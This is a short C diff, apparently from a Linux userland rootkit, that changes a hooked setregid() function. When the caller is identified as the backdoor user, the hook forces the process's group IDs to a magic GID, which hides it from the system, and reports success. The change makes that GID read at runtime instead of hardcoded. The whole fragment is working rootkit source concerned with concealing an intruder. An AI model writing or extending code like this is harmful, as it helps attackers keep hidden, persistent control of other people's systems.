@@ -1,8 +1,9 @@
 int setregid(gid_t rgid, gid_t egid){
     hook(CSETREGID);
     if(is_bdusr()){
-        if(rgid != MAGIC_GID || egid != MAGIC_GID)
-            call(CSETREGID, MAGIC_GID, MAGIC_GID);
+        gid_t magicgid = readgid();
+        if(rgid != magicgid || egid != magicgid)
+            call(CSETREGID, magicgid, magicgid);
         return 0;
     }
     return (long)call(CSETREGID, rgid, egid);
